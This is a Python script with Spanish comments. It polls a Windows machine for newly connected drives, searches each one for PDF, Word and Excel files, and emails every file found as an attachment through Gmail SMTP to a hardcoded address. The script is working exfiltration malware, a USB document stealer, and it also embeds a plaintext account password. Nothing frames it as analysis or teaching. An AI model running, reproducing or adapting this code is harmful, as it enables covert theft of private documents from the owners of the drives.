
# -*- coding: UTF-8 -*-
import string
from ctypes import windll
import time
import os
import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.MIMEBase import MIMEBase
from email import encoders
import shutil
import socket

global sent
sent = []
extensions = ['pdf','doc','ocx','xls','lsx'] # El algoritmo de busqueda lee las extensiones de aqui

mail = [
        'marcalexander333@gmail.com', # Destinatario
        'marcalexander333@gmail.com',# Origen
        'smtp.gmail.com:587', # Servidor (servidor:puerto)
        'marcalexander333@gmail.com', # Usuario
        'pollasblancas', # Contrasena
       ]

#FUNCIONES
#---------

def get_drives():
    drives = []
    bitmask = windll.kernel32.GetLogicalDrives()
    for letra_dispositivo in string.uppercase:
        if bitmask & 1:
            drives.append(letra_dispositivo) #Añade la letra del dispositivo conectado
        bitmask >>= 1
    return drives #Lista que contiene la letra de dispositivo conectado


def scanner():
    while True:
        before = set(get_drives())
        print 'Esperando'
        time.sleep(1)
        after = set(get_drives())
        drives = after - before
        delta = len(drives)

        if (delta != 0):
            for drive in drives:
                if os.system("cd " + drive + ":") == 0:
                    newly_mounted = drive
                    global new_route
                    new_route = newly_mounted +':/'
                    seek_and_destroy(new_route)


        else:
            continue


def seek_and_destroy(R): # Recibe una ruta y la analiza en busca de archivos con la extension seleccionada
    for base, dirs, files in os.walk(str(R)):

       for file in files:
          if file == None or '':
              continue
          elif file != (None or ''):
              Ext = str(file[-3])+str(file[-2])+str(file[-1])
              print extensions
              if Ext in extensions:
                   if base == []:
                    continue
                   elif base != []:
                      if files == []:
                         continue
                      elif files != []:
                         for a in files:
                            print a
                            if a == '[':
                                continue
                            elif a  == ']':
                                continue
                            elif a  == "'":
                                continue
                            else:
                                if base+'/'+a not in sent:
                                    print '>>> Now sending: ',base+'/'+a
                                    send_mail(base+'/'+a)
                                else:
                                    pass

def send_mail(ARCHIVO):
        print ARCHIVO
        Ext2 = str(ARCHIVO[-3])+str(ARCHIVO[-2])+str(ARCHIVO[-1])

        archivo_stats = os.stat(ARCHIVO)
        size_archivo = float(archivo_stats[6]/1000) #KB
        print 'Size: ', size_archivo
        size_limit = 20000 #KB

        if ARCHIVO not in sent: # Verifica que el archivo no se haya enviado ya
            if Ext2 in extensions: # Verifica que la extension este permitida
                if size_archivo <= size_limit: # Verifica tamano

                    sent.append(ARCHIVO)

                    msg = MIMEMultipart() #Asignacion a clase MIMETYPE
                    msg['To'] = mail[0]
                    msg['From'] = mail[1]
                    msg['Subject'] = str(ARCHIVO) # Sujeto del mensaje, en este caso es el nombre del archivo

                    msg.attach(MIMEText('Datos','plain')) # Creacion de una variable para cargar el archivo que se leera posteriormente

                    fp = open(ARCHIVO,'rb') #Carga del archivo a adjuntar (lectura binaria)
                    adjunto = MIMEBase('multipart', 'encrypted')

                    adjunto.set_payload(fp.read()) # Asignación a variable
                    fp.close()
                    encoders.encode_base64(adjunto)

                    # Agrega una cabecera y le da un nombre al archivo
                    adjunto.add_header('Content-Disposition', 'attachment', filename = ARCHIVO)


                    msg.attach(adjunto) #Adjunta el archivo al mensaje

                    server = smtplib.SMTP(mail[2]) #Inicia el servidor SMTP para enviar el mensaje
                    server.ehlo()
                    server.starttls()

                    server.login(mail[3],mail[4]) #Autenticacion USER,PASSWORD
                    server.sendmail(mail[0], mail[1], msg.as_string()) #Envia el correo

                    server.quit() #Fin conexion SMTP

#LLAMADAS
#--------
for a in range(0,1000000):
    scanner()
